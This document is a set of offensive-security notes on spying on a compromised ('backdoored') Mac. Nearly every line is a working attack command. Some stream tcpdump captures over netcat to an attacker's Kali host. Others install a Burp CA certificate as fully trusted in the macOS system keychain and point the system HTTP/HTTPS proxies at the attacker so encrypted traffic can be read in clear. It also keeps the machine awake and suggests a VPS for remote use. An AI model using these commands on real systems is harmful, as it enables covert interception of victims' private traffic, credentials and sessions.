# Netcat & TCPDump:

## Data in file:

Sniff traffic from a mac with netcat (default on macos) and use tcpdump (default on macos) to send the traffic to Kali then use wireshark to analyse that traffic:

	- nc -l -p 7777 | tee /tmp/sniffed_output.pcap (on kali, without -p for mac)
	- /usr/sbin/tcpdump -w - | nc KALI_IP 7777 (on mac)

## Data in real time:

On kali:

	- mkfifo /tmp/wiretap
	- nc -l -p 9999 > /tmp/wiretap
	- wireshark -k -i /tmp/wiretap

On mac:

	- /usr/sbin/tcpdump -i <interface> -w - | nc 1.2.3.4 9999

## Sniffing https traffic (BURP):

Download BURP Pro and execute file (optional):

	- sudo bash /path/to/file

Open and configure proxy on burpsuite (port and ip).

On backdoored mac:

	- curl -s --insecure --proxy http://192.168.0.110:8080 http://burp/cert -o /tmp/burp.der (download certificate)

In the above command, curl will silently (-s) download the certificate from our Kali machine. The --proxy argument is required because we're instructing curl to use the newly configured Burp listener to fetch the certificate; This certificate isn't trusted by curl (or any web browser) by default, so the --insecure argument is required to ignore warnings in the output. Finally, the Burp certificate is saved (-o) to the /tmp directory with the file name burp.der. The .der file extension is merely the certificate's default file format and shouldn't be changed.

	- security add-trusted-cert -k /Library/Keychains/System.keychain -d /tmp/burp.der (add certificate to mac keychain)

Security will add (add-trusted-cert) and fully trust the certificate (-d /tmp/burp.der) into the macOS primary system Keychain (-k). All we have to do now is configure macOS to send us all of the target's web traffic.

List network services (optional):

	- /usr/sbin/networksetup -listallnetworkservices
	- /usr/sbin/networksetup -getwebproxy "Wi-Fi"
	- /usr/sbin/networksetup -getsecurewebproxy "Wi-Fi"

Active the certicate for http and https requests:

	- /usr/sbin/networksetup -setwebproxy "Wi-fi" 192.168.0.110 8080
	- /usr/sbin/networksetup -setsecurewebproxy "Wi-fi" 192.168.0.110 8080

Then in Burp, in HTTP history, all the traffic appear in clear.

We can send the encoded URL parameters in encoders, choose URL format, to decode parameters if necessary.

PortSwigger CA certificate are certificate created from Burp, can search it on keychain. Also can verify proxy configuration on system preference, network, on mac.

## Use caffeinate to force keep the connection open:

	- caffeinate &

## Desactive the certificate for http and https:

	- /usr/sbin/networksetup -setwebproxystate "Wi-fi" off
	- /usr/sbin/networksetup -setsecurewebproxystate "Wi-fi" off

Can use a VPS to use this technic if we are not in the same network.